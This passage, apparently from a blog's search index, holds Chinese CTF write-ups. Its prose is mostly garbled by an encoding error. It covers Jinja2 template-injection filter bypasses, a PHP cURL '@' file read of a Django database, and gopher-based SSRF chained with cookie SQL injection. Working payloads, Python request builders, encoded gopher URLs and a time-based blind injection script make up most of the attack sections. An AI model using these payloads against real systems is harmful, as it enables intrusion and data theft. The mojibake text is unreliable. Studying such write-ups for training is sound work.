è¿™é‡Œæ˜¯è¿‡æ»¤äº†classï¼Œmroï¼Œsubclassesï¼Œbaseã€‚é‚£å°±å¯ä»¥å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œæˆ–è€…åˆ©ç”¨request éšåå›æƒ³åˆ°ä¹‹å‰çš„æºä»£ç ï¼Œæ˜¾ç¤º &lt;!--Flag @ /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt--&gt; &lt;!--Salt @ /opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt--&gt; é‚£å¾ˆå¥½æƒ³ï¼Œè¿™ä¸ªtxtå°±æ˜¯flagæ‰€åœ¨æ–‡ä»¶äº†ï¼Œé‚£æˆ‘ä»¬å°±åº”è¯¥åˆ©ç”¨readå‡½æ•°ï¼Œä½†readä¹Ÿè¢«è¿‡æ»¤ payload1ï¼š {{''[\"__c\"\"lass__\"][\"__mr\"\"o__\"][2][\"__subcl\"+\"asses__\"]()[40] ('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[\"re\"\"ad\"]()}} payload2: {{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?&amp;a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read å‚è€ƒæ–‡ç« ï¼š SSTIæ¨¡æ¿æ³¨å…¥ç»•è¿‡ï¼ˆè¿›é˜¶ç¯‡ï¼‰_yu22xçš„åšå®¢-CSDNåšå®¢_sstiç»•è¿‡ SSTIæ¨¡æ¿æ³¨å…¥åŠç»•è¿‡å§¿åŠ¿(åŸºäºPython-Jinja2)_Y4tackerçš„åšå®¢-CSDNåšå®¢_sstiç»•è¿‡","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-Cat","path":"/2023/08/21/cat/","content":"é¢˜ç›®æè¿°ï¼š æŠ“ä½é‚£åªçŒ« é¢˜ç›®è§£é¢˜ï¼š é‚£å°±éšä¾¿è¾“å‡ ä¸‹ æµ‹è¯•å‡ ä¸‹å‘ç°åªæœ‰127.0.0.1æœ‰å›æ˜¾ï¼Œä»¥ä¸ºæ˜¯å‘½ä»¤æ‰§è¡Œï¼Œä½†ä¼¼ä¹è¿‡æ»¤äº†å¾ˆå¤šï¼Œæ‰‹å·¥æœ‰ç‚¹éš¾æï¼Œé‚£å°±ç”¨å­—å…¸fuzzä¸€ä¸‹çœ‹çœ‹è¿‡æ»¤äº†ä»€ä¹ˆ çœ‹åˆ°å¦‚æ­¤ä¹‹é•¿çš„å›æ˜¾ï¼ŒæƒŠå‘†äº†ï¼Œçœ‹ä¸€ä¸‹å†…å®¹ ç”¨æ¸¸è§ˆå™¨æ‰“å¼€å¹¶æœç´¢flagï¼Œå¹¶æ²¡æœ‰ï¼Œåªèƒ½è€è€å®å®çš„è¿›è¡Œä»£ç å®¡è®¡ è¿™é‡Œçœ‹åˆ°æ•æ„Ÿè¯æ±‡djangoï¼ŒPythonçš„æ¨¡å—Djangoä¹‹æ‰€ä»¥å­˜åœ¨è¿™ä¸ªæŠ¥é”™åŸå› æ˜¯å› ä¸ºï¼š djangoæŠ¥é”™é¡µé¢å°†è¾“å…¥çš„å‚æ•°ä¼ åˆ°äº†åç«¯çš„djangoæœåŠ¡ä¸­è¿›è¡Œè§£æï¼Œè€Œdjangoè®¾ç½®äº†ç¼–ç ä¸ºgbkå¯¼è‡´é”™è¯¯ç¼–ç äº†å®½å­—ç¬¦ï¼ˆè¶…è¿‡äº†asciiç èŒƒå›´ï¼‰ã€‚ å‚è€ƒwpï¼šæ—¢ç„¶æ˜¯djangoæ–‡ä»¶è¿˜æœ‰å‰ç«¯ä»£ç ï¼Œå¤åˆ¶åç”¨æ¸¸è§ˆå™¨æ‰“å¼€è¯•è¯•ï¼š å°†htmlåœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ï¼Œå¯ä»¥çœ‹å‡ºåç«¯è¿è¡ŒDjangoï¼Œç”±äºå­—ç¬¦ç¼–ç é—®é¢˜è€ŒæŠ¥é”™ã€‚åœ¨è¯·æ±‚ä¿¡æ¯POSTä¸€é¡¹ä¸­å¯ä»¥æ‰¾åˆ°å‚æ•°urlï¼Œäºæ˜¯å¤§è‡´å¯ä»¥çŒœæƒ³åˆ°æ˜¯PHPå‘æœ¬æœºçš„Djangoå‘å‡ºäº†POSTè¯·æ±‚ï¼Œå‚æ•°å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„urlã€‚ ç”¨æ¸¸è§ˆå™¨æ‰“å¼€ä»¥åæœ€åº•ä¸‹å¯ä»¥çœ‹åˆ°ä¸€ä¸²æç¤ºï¼šYouâ€™re seeing this error because you have DEBUG = True in your Django settings file. Change that to False, and Django will display a standard page generated by the handler for this status code. ä¹Ÿå°±æ˜¯è¯´ï¼ŒTrue in your Django settings file.æœ‰å¯èƒ½flagæ–‡ä»¶åœ¨ settings file ä¸­ã€‚ ç›´æ¥æœç´¢settingsï¼Œä¼šå‘ç°å¾ˆå¤šï¼Œä½†æ˜¯æ¯”è¾ƒç‰¹æ®Šçš„æœ‰è¿™ä¸ªï¼ˆå’Œsettingså’Œdatabaseæœ‰å…³ï¼Œç™¾åº¦æœç´¢ï¼‰ PHPé€šå¸¸ä½¿ç”¨cURLåº“ä¸ä½œä¸ºå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨é€šä¿¡ï¼Œåœ¨cURLåº“çš„CURLOPT_POSTFILEDSé€‰é¡¹ä¸­å¯ä»¥æ‰¾åˆ°çªç ´å£ï¼Œå€Ÿæ­¤æˆ‘ä»¬å¯ä»¥çˆ†å‡ºæ•°æ®åº“å†…å®¹ çœ‹å…¶ä»–å¤§ä½¬çš„æ–‡æ¡£ï¼Œå‘ç°äº†@æœ‰å…³ï¼Œphpä¸­curlå‡½æ•°@çš„ä½œç”¨PHPä¸­curlçš„CURLOPT_POSTFIELDSå‚æ•°ä½¿ç”¨ç»†èŠ‚ - 52php - åšå®¢å›­ æˆ‘ä»¬ä½¿ç”¨@è¿›è¡Œæ–‡ä»¶ä¼ é€’ï¼Œå¯¹æ–‡ä»¶è¿›è¡Œè¯»å–ä¹‹åè¿˜ä¼šæŠŠå†…å®¹ä¼ ç»™urlå‚æ•°ï¼Œå¦‚æœåƒä¸Šé¢ä¸€æ ·æœ‰è¶…å‡ºè§£æèŒƒå›´çš„ç¼–ç çš„æ—¶å€™å°±ä¼šå¾—åˆ°é”™è¯¯ä¿¡æ¯ã€‚ æœ€ç»ˆçš„payloadï¼š@/opt/api/database.sqlite3 åœ¨æ–‡ä¸­è¿˜éœ€è¦æœç´¢flagæˆ–è€…ctfç­‰ç­‰å…³é”®å­—ç¬¦ï¼š æ‰¾åˆ°flag æ€»ç»“ URLç¼–ç ï¼šHTTPåªèƒ½ä¼ è¾“çº¦å®šçš„ASCIIå­—ç¬¦ï¼ˆå³ASCIIç å€¼127ä»¥å†…ï¼‰ï¼Œè‹¥è¦ä¼ è¾“å…¶ä»–å­—ç¬¦å’Œä¸€äº›ASCIIå€¼åœ¨127ä»¥å†…çš„ç‰¹æ®Šå­—ç¬¦ï¼Œåˆ™éœ€è¦å¯¹å…¶è½¬ä¹‰â€”â€”æ–¹æ³•æ˜¯åœ¨å…¶åå…­è¿›åˆ¶ASCIIå€¼å‰åŠ ä¸€ä¸ª%ï¼Œæ³¨æ„çº¦å®šå­—ç¬¦ä¹Ÿå¯ä»¥ç¼–ç ä½†æ˜¯æ•ˆæœä¸€æ ·ã€‚URLç¼–ç çš„ä¸´ç•Œå€¼ä¸º%7Fï¼ˆ127ï¼‰ï¼Œç”±äºè®¡ç®—æœºæ™®éå­˜åœ¨çš„ç¼–ç è½¬æ¢é—®é¢˜ï¼Œæˆ‘ä»¬å¸¸å¸¸å¯ä»¥åœ¨è¿™é‡Œfuzzä¸€ä¸‹ã€‚ Djangoï¼šDjangoæ˜¯ä¸€ä¸ªç”¨pythonå†™æˆçš„webåº”ç”¨æ¡†æ¶ã€‚ Djangoé¡¹ç›®çš„ç›®å½•å¸ƒå±€å¦‚ä¸‹ï¼š Djangoé¡¹ç›®ä¸­appçš„ç›®å½•å¸ƒå±€å¦‚ä¸‹ï¼š PHPçš„cURLåº“ï¼šPHPä¸­çš„cURLåº“æ”¯æŒPHPä½œä¸ºå®¢æˆ·ç«¯è®¿é—®å…¶ä»–æœåŠ¡å™¨ï¼Œå¹¶æ”¯æŒå¤šç§åè®®ã€‚è¿™é‡Œä»æŠ¥é”™ä¿¡æ¯ä¸­å¯ä»¥çœ‹å‡ºï¼Œä¸Djangoçš„äº¤äº’æ˜¯ä½¿ç”¨HTTPåè®®ã€‚ å‚è€ƒæ–‡ç« ï¼š wpå‚è€ƒä¸€ wpå‚è€ƒäºŒ wpå‚è€ƒä¸‰ å…·ä½“çš„acunetixä½¿ç”¨æ–¹å¼Acunetix Web Vulnerability ä½¿ç”¨æ‰‹å†Œ_æ—å¤•#çš„åšå®¢-CSDNåšå®¢_awvsä½¿ç”¨æ‰‹å†Œ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-very_easy_sql","path":"/2023/08/21/very-easy-sql/","content":"é¢˜ç›®æè¿°ï¼š å¤ªç®€å•äº†ä¸æè¿°äº†ï¼Œç»™sqlç­¾ä¸ªåˆ°å§ é¢˜ç›®è§£é¢˜ï¼š æ‰“å¼€é¡µé¢ï¼Œè¿™é‡Œè¯´æˆ‘ä»¬ä¸æ˜¯å†…éƒ¨ç”¨æˆ·ä¸èƒ½è®¿é—®ï¼Œé‚£ä¼°è®¡å¾—åˆ©ç”¨ssrfï¼Œè¿™é‡Œå…ˆæµ‹è¯•ä¸€ä¸‹è¡¨å•ã€‚å…ˆå°è¯•äº†å¼±å£ä»¤ï¼Œæ²¡ç”¨ï¼Œåœ¨å°è¯•ä¸‡èƒ½å¯†ç ï¼š'or 1=1#ï¼Œä¹Ÿæ²¡ä¿¡æ¯ï¼Œé‚£çœ‹ä¸€ä¸‹æºä»£ç  å‘ç°phpï¼Œè®¿é—®ä¸€ä¸‹ ä¸å‡ºæ‰€æ–™è¿™é‡Œå°±æ˜¯ssrfåˆ©ç”¨ç‚¹ã€‚è¿™é‡Œä¹Ÿæ˜¯æµ‹è¯•ä¸€ç•ªï¼Œå‘ç°åªæœ‰è¾“å…¥127.0.0.1æœ‰ååº” bpæŠ“åŒ…çœ‹ä¸€ä¸‹ä¼¼ä¹ä¹Ÿæ²¡å•¥ä¿¡æ¯ï¼Œè¿™é‡Œä¹Ÿå°±æ²¡æ€è·¯ï¼Œå› ä¸ºssrfçš„åˆ©ç”¨ä¸å¤ªä¼šï¼Œå› æ­¤å°±å€Ÿé‰´wpå§ã€‚ çœ‹äº†wpè¿™é‡Œæ˜¯è¦åˆ©ç”¨åè®®æ¥å®ç°å†…éƒ¨è®¿é—® Gopheråè®® â€‹ å®šä¹‰ï¼šGopheræ˜¯Internetä¸Šä¸€ä¸ªéå¸¸æœ‰åçš„ä¿¡æ¯æŸ¥æ‰¾ç³»ç»Ÿï¼Œå®ƒå°†Internetä¸Šçš„æ–‡ä»¶ç»„ç»‡æˆæŸç§ç´¢å¼•ï¼Œå¾ˆæ–¹ä¾¿åœ°å°†ç”¨æˆ·ä»Internetçš„ä¸€å¤„å¸¦åˆ°å¦ä¸€å¤„ã€‚åœ¨WWWå‡ºç°ä¹‹å‰ï¼ŒGopheræ˜¯Internetä¸Šæœ€ä¸»è¦çš„ä¿¡æ¯æ£€ç´¢å·¥å…·ï¼ŒGopherç«™ç‚¹ä¹Ÿæ˜¯æœ€ä¸»è¦çš„ç«™ç‚¹ï¼Œä½¿ç”¨tcp70ç«¯å£ã€‚ä½†åœ¨WWWå‡ºç°åï¼ŒGopherå¤±å»äº†æ˜”æ—¥çš„è¾‰ç…Œã€‚ç°åœ¨å®ƒåŸºæœ¬è¿‡æ—¶ï¼Œäººä»¬å¾ˆå°‘å†ä½¿ç”¨å®ƒï¼› gopheråè®®æ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼šå¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œåœ¨æ„æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­æœ€å¼ºå¤§çš„åè®® é™åˆ¶ï¼šgopheråè®®åœ¨å„ä¸ªç¼–ç¨‹è¯­è¨€ä¸­çš„ä½¿ç”¨é™åˆ¶Gopheråè®®æ ¼å¼ï¼š URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_åæ¥TCPæ•°æ®æµ gopherçš„é»˜è®¤ç«¯å£æ˜¯70 å¦‚æœå‘èµ·postè¯·æ±‚ï¼Œå›è½¦æ¢è¡Œéœ€è¦ä½¿ç”¨%0d%0aï¼Œå¦‚æœå¤šä¸ªå‚æ•°ï¼Œå‚æ•°ä¹‹é—´çš„&amp;ä¹Ÿéœ€è¦è¿›è¡ŒURLç¼–ç  å‰©ä¸‹çš„ç»†èŠ‚å°±å‚è€ƒï¼šgopheråè®®åŸºç¡€ gopherå®æˆ˜1ï¼šgopheråè®®çš„åˆ©ç”¨ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· gopherå®æˆ˜2ï¼šGopheråè®®åœ¨SSRFæ¼æ´ä¸­çš„æ·±å…¥ç ”ç©¶ï¼ˆé™„è§†é¢‘è®²è§£ï¼‰ - çŸ¥ä¹ (zhihu.com) ssrfå‚è€ƒï¼šSSRFæ¼æ´ - Saint_Michael - åšå®¢å›­ (cnblogs.com) SSRFæ·±å…¥å„ç§é«˜çº§å®æˆ˜ç”¨æ³•_G0miniçš„åšå®¢-CSDNåšå®¢ ssrfæ¼æ´åˆ©ç”¨(å†…ç½‘æ¢æµ‹ã€æ‰“redis) - ctrl_TTè±† - åšå®¢å›­ (cnblogs.com) ç²®é£Ÿå……è¶³~ æŠ“åŒ…é¦–é¡µpostè¡¨å•å‘ç°å“åº”åŒ…æœ‰set-cookieï¼Œwpè¯´ï¼šæœ‰ä¸€ä¸ªSet-Cookieä»£è¡¨å¦‚æœè¾“å…¥æ­£ç¡®çš„è´¦å·è·Ÿå¯†ç æ˜¯å¯ä»¥è¿”å›çš„ï¼Œå¯ä»¥å°è¯•çˆ†ç ´ æ€æ¥æƒ³å»ï¼Œè¿™é‡Œåº”è¯¥å°±æ˜¯ç»“åˆssrfæ¥ç™»å½•å®ç°å†…éƒ¨è®¿é—®è·å–cookie é‚£è¿™é‡Œå°±éœ€è¦ä¸‡èƒ½çš„gopheråè®®äº†ï¼Œä¸è¿‡è‡ªèº«å¤ªèœï¼Œåªèƒ½ä½œä¸ºä¸€ä¸ªè„šæœ¬å°å­äº†ï¼Œè™½ä¸ä¼šå†™ä½†å’±ä¹Ÿå¾—çœ‹æ‡‚ import urllib.parse #å¯¼å…¥åº“ urllib.parseï¼Œç”¨äºURLè§£æä¸è½¬ç  content = \"uname=admin&amp;passwd=admin\" content_length = len(content) # æ„é€ è¯·æ±‚ä½“å†…å®¹ test =\\ \"\"\"POST /index.php HTTP/1.1 Host: 127.0.0.1:80 User-Agent: curl/7.43.0 Accept: */* Content-Type: application/x-www-form-urlencoded Content-Length: {} uname=admin&amp;passwd=admin\t# è¿™é‡Œä¼¼ä¹ä¸ç”¨å†æ¬¡å†™ \"\"\".format(content_length) # æ„é€ httpè¯·æ±‚ tmp = urllib.parse.quote(test) # è¿›è¡ŒURLç¼–ç  new = tmp.replace(\"%0A\", \"%0D%0A\") # å°†%0Aæ›¿æ¢ä¸º%0D%0A æŠŠ æ¢è¡Œç¬¦æ›¿æ¢ä¸º\\r result = urllib.parse.quote(new) # å†æ¬¡è¿›è¡ŒURLç¼–ç  print(\"gopher://127.0.0.1:80/_\"+result) # è¾“å‡ºç»“æœ è¾“å‡ºå¦‚ä¸‹ gopher://127.0.0.1:80/_POST%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl/7.43.0%250D%250AAccept%253A%2520%252A/%252A%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252024%250D%250A%250D%250Auname%253Dadmin%2526passwd%253Dadmin%2509%2523%2520%25E8%25BF%2599%25E9%2587%258C%25E4%25BC%25BC%25E4%25B9%258E%25E4%25B8%258D%25E7%2594%25A8%25E5%2586%258D%25E6%25AC%25A1%25E5%2586%2599%250D%250A è¿™é‡ŒæŠ“åŒ…çœ‹å›æ˜¾ï¼Œæœ‰ä¸¤ä¸ªcookieï¼Œé‚£ä¼°è®¡æ˜¯æˆ‘ä»¬åœ¨useé¡µé¢ç›´æ¥è®¿é—®127.0.0.1æ—¶ï¼Œå…¶cookieè¢«ä¸Šé¢çš„cookieè¦†ç›–äº†ã€‚é‚£è¿™é‡Œç¬¬äºŒä¸ªcookieå°±æ˜¯æˆ‘ä»¬ç™»å½•æ—¶å¾—åˆ°cookieï¼Œé‚£å¾ˆæ˜æ˜¾è¿™ä¸ªcookieå°±æ˜¯æ³¨å…¥ç‚¹ã€‚ æŠ¥é”™æ³¨å…¥ è¿™é‡Œè§£ç å‘ç°ä¸ºadminï¼Œé‚£ç°åœ¨å°±æ˜¯æµ‹è¯•é—­åˆæ–¹å¼äº†ï¼Œå…ˆæµ‹è¯•adminâ€™ # import urllib.parse host = \"127.0.0.1:80\" cookie=\"this_is_your_cookie=YWRtaW4nICM=\" test =\\ \"\"\"GET /index.php HTTP/1.1 Host: {} Connection: close Content-Type: application/x-www-form-urlencoded Cookie:{} \"\"\".format(host,cookie) tmp = urllib.parse.quote(test) new = tmp.replace(\"%0A\",\"%0D%0A\") result = urllib.parse.quote(new) print(\"gopher://\"+host+\"/_\"+result) è¾“å‡º: gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nICM%253D%250D%250A%250D%250A å‘ç°é¡µé¢æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œé‚£æˆ‘ä»¬å°±å¼€å§‹æŠ¥é”™æ³¨å…¥å§ï¼Œè¿™é‡Œçœ‹åˆ°near â€˜â€™ï¼Œé‚£åº”è¯¥å°±æ˜¯adminâ€™)é—­åˆçš„æ–¹å¼ï¼Œæˆ‘ä»¬ç›´æ¥æµ‹è¯•çœ‹çœ‹ payloadä¸ºï¼šadmin') and extractvalue(1, concat(0x7e, (select database()),0x7e)) # import urllib.parse import base64 host = \"127.0.0.1:80\" payload = \"admin') and extractvalue(1, concat(0x7e,(select database()),0x7e)) #\" base64_payload = str(base64.b64encode(payload.encode(\"utf-8\")), \"utf-8\") cookie=\"this_is_your_cookie=\"+base64_payload test =\\ \"\"\"GET /index.php HTTP/1.1 Host: {} Connection: close Content-Type: application/x-www-form-urlencoded Cookie:{} \"\"\".format(host,cookie) tmp = urllib.parse.quote(test) new = tmp.replace(\"%0A\",\"%0D%0A\") result = urllib.parse.quote(new) print(\"gopher://\"+host+\"/_\"+result) è¾“å‡ºï¼š gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSkpICM%253D%250D%250A%250D%250A æŸ¥è¡¨ï¼š admin') and extractvalue(1, concat(0x7e, (select GROUP_CONCAT(table_name)from information_schema.tables WHERE table_schema='security'),0x7e)) # import urllib.parse import base64 host = \"127.0.0.1:80\" payload = \"admin') and extractvalue(1, concat(0x7e, (select GROUP_CONCAT(table_name)from information_schema.tables WHERE table_schema='security'),0x7e)) #\" base64_payload = str(base64.b64encode(payload.encode(\"utf-8\")), \"utf-8\") cookie=\"this_is_your_cookie=\"+base64_payload test =\\ \"\"\"GET /index.php HTTP/1.1 Host: {} Connection: close Content-Type: application/x-www-form-urlencoded Cookie:{} \"\"\".format(host,cookie) tmp = urllib.parse.quote(test) new = tmp.replace(\"%0A\",\"%0D%0A\") result = urllib.parse.quote(new) print(\"gopher://\"+host+\"/_\"+result) è¾“å‡º: gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IEdST1VQX0NPTkNBVCh0YWJsZV9uYW1lKWZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBXSEVSRSB0YWJsZV9zY2hlbWE9J3NlY3VyaXR5JyksMHg3ZSkpICM%253D%250D%250A%250D%250A è¿™é‡Œæœ‰è¿‡æ»¤ï¼Œä¼¼ä¹æ˜¯è¿‡æ»¤äº†group_concat æŸ¥åˆ—ï¼šadmin') and extractvalue(1, concat(0x7e, (select GROUP_CONCAT(column_name)from information_schema.columns WHERE table_name='flag'),0x7e)) # import urllib.parse import base64 host = \"127.0.0.1:80\" payload = \"admin') and extractvalue(1, concat(0x7e, (select GROUP_CONCAT(column_name)from information_schema.columns WHERE table_name='flag'),0x7e)) #\" base64_payload = str(base64.b64encode(payload.encode(\"utf-8\")), \"utf-8\") cookie=\"this_is_your_cookie=\"+base64_payload test =\\ \"\"\"GET /index.php HTTP/1.1 Host: {} Connection: close Content-Type: application/x-www-form-urlencoded Cookie:{} \"\"\".format(host,cookie) tmp = urllib.parse.quote(test) new = tmp.replace(\"%0A\",\"%0D%0A\") result = urllib.parse.quote(new) print(\"gopher://\"+host+\"/_\"+result) è¾“å‡ºï¼š gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IEdST1VQX0NPTkNBVChjb2x1bW5fbmFtZSlmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIFdIRVJFIHRhYmxlX25hbWU9J2ZsYWcnKSwweDdlKSkgIw%253D%253D%250D%250A%250D%250A æŸ¥å†…å®¹ admin') and extractvalue(1, concat(0x7e, (select flag from flag),0x7e)) # import urllib.parse import base64 host = \"127.0.0.1:80\" payload = \"admin') and extractvalue(1, concat(0x7e, (select flag from flag),0x7e)) #\" base64_payload = str(base64.b64encode(payload.encode(\"utf-8\")), \"utf-8\") cookie=\"this_is_your_cookie=\"+base64_payload test =\\ \"\"\"GET /index.php HTTP/1.1 Host: {} Connection: close Content-Type: application/x-www-form-urlencoded Cookie:{} \"\"\".format(host,cookie) tmp = urllib.parse.quote(test) new = tmp.replace(\"%0A\",\"%0D%0A\") result = urllib.parse.quote(new) print(\"gopher://\"+host+\"/_\"+result) è¾“å‡ºï¼š gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IGZsYWcgZnJvbSBmbGFnKSwweDdlKSkgIw%253D%253D%250D%250A%250D%250A æ­¤æ—¶å‡ºç°äº†å¦ä¸€ä¸ªé—®é¢˜ï¼ŒæŠ¥é”™çš„å›æ˜¾æœ€å¤§ä½æ•°ä¸º32ä½ï¼Œæ­¤æ—¶æˆ‘ä»¬åªè·å¾—äº†32ä½ï¼Œéœ€è¦ç”¨substrå‡½æ•°è¿›è¡Œåˆ†å‰²è¯»å–ï¼š åˆ†å‰²è¯»å– admin') and extractvalue(1, concat(0x7e, substr((SELECT flag from flag),30,32),0x7e)) # import urllib.parse import base64 host = \"127.0.0.1:80\" payload = \"admin') and extractvalue(1, concat(0x7e, substr((SELECT flag from flag),30,32),0x7e)) #\" base64_payload = str(base64.b64encode(payload.encode(\"utf-8\")), \"utf-8\") cookie=\"this_is_your_cookie=\"+base64_payload test =\\ \"\"\"GET /index.php HTTP/1.1 Host: {} Connection: close Content-Type: application/x-www-form-urlencoded Cookie:{} \"\"\".format(host,cookie) tmp = urllib.parse.quote(test) new = tmp.replace(\"%0A\",\"%0D%0A\") result = urllib.parse.quote(new) print(\"gopher://\"+host+\"/_\"+result) è¾“å‡ºï¼š gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCBzdWJzdHIoKFNFTEVDVCBmbGFnIGZyb20gZmxhZyksMzAsMzIpLDB4N2UpKSAj%250D%250A%250D%250A æ—¶é—´ç›²æ³¨ è¿™é‡Œåˆ†äº«æ—¶é—´ç›²æ³¨è„šæœ¬ import requests #å¯¼å…¥åº“requests,ç”¨äºå‘é€HTTPè¯·æ±‚ï¼Œæ³¨æ„è¿™ä¸ªéœ€è¦å®‰è£… import time #å¯¼å…¥åº“timeï¼Œç”¨äºè®¡æ—¶ import base64 #å¯¼å…¥åº“base64ï¼Œç”¨äºè½¬ç  url = \"http://61.147.171.105:64317/use.php?url=\" #http://61.147.171.105:64317æ˜¯ç½‘å€åŠç«¯å£ï¼Œéœ€è¦æ›´æ”¹ï¼›/use.phpæ˜¯æºç æç¤ºçš„SSRFè·³æ¿ç½‘å€ï¼›url=åæ¥éœ€è¦è·³è½¬çš„ç½‘å€ flag = \"\" #å‡†å¤‡è¾“å‡ºflagå­—ç¬¦ä¸² for pos in range(1, 50): for i in range(33, 127): # poc=\"') union select 1,2,if(1=1,sleep(5),1) # \" #')æ³¨é‡Šï¼Œè”åˆæŸ¥è¯¢ 1ï¼Œ2ï¼Œå»¶æ—¶æ³¨å…¥çŒœæµ‹æ³¨å…¥ç‚¹ # security # poc=\"') union select 1,2,if(ascii( substr((database()),\"+str(pos)+\",1) )=\"+str(i)+\",sleep(2),1) # \" #è”åˆæŸ¥è¯¢ï¼Œasciiç¼–ç å»¶æ—¶æ³¨å…¥çŒœæµ‹åº“å # flag # poc=\"') union select 1,2,if(ascii( substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),\"+str(pos)+\",1) )=\"+str(i)+\",sleep(2),1) # \" #è”åˆæŸ¥è¯¢ï¼ŒçŒœæµ‹æ–‡ä»¶å poc = \"') union select 1,2,if(ascii( substr((select * from flag),\" + str(pos) + \",1) )=\" + str( i) + \",sleep(2),1) # \" #è¯»å–æ–‡ä»¶flagä¸­çš„å€¼ bs = str(base64.b64encode(poc.encode(\"utf-8\")), \"utf-8\") #flagçš„å€¼ç»è¿‡utf-8äºbase64ç¼–ç  final_poc = \"gopher://127.0.0.1:80/_GET%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aCookie%3A%20this%5Fis%5Fyour%5Fcookie%3D\" + bs + \"%3B%250d%250a\" #éœ€è¦è§£ç ï¼Œå†…å®¹è¯·å‚è€ƒæˆªå›¾ t1 = time.time() res = requests.get(url + final_poc) t2 = time.time() if (t2 - t1 &gt; 2):#ä»¥ä¸Šå››è¡Œä¸ºå»¶æ—¶æ³¨å…¥çš„æ—¶é—´åˆ¤æ–­è¯­å¥ï¼Œçˆ†ç ´æœŸé—´å¦‚æœæŸå­—ç¬¦è¿”å›å“åº”çš„æ—¶é—´è¾ƒé•¿ flag += chr(i) #å†™å…¥å­—ç¬¦ä¸²flag print(flag) #è¾“å‡ºflag break #è¿›å…¥ä¸‹ä¸€å­—ç¬¦çš„çˆ†ç ´ print(flag) å…¶ä¸­ å˜é‡final_pocç»è¿‡ä¸¤æ¬¡urlè§£ç ï¼Œå†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼Œå°†å˜é‡bs(ç¼–ç åçš„å˜é‡poc)ä¼ åˆ°æœåŠ¡å™¨~ å‚è€ƒæ–‡ç« ï¼š å‰©ä¸‹çš„ç»†èŠ‚å°±å‚è€ƒï¼šgopheråè®®åŸºç¡€ gopherå®æˆ˜1ï¼šgopheråè®®çš„åˆ©ç”¨ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· gopherå®æˆ˜2ï¼šGopheråè®®åœ¨SSRFæ¼æ´ä¸­çš„æ·±å…¥ç ”ç©¶ï¼ˆé™„è§†é¢‘è®²è§£ï¼‰ - çŸ¥ä¹ (zhihu.com) SSRFå®æˆ˜1ï¼šSSRFæ¼æ´ - Saint_Michael - åšå®¢å›­ (cnblogs.com) SSRFå®æˆ˜2ï¼šSSRFæ·±å…¥å„ç§é«˜çº§å®æˆ˜ç”¨æ³•_G0miniçš„åšå®¢-CSDNåšå®¢ 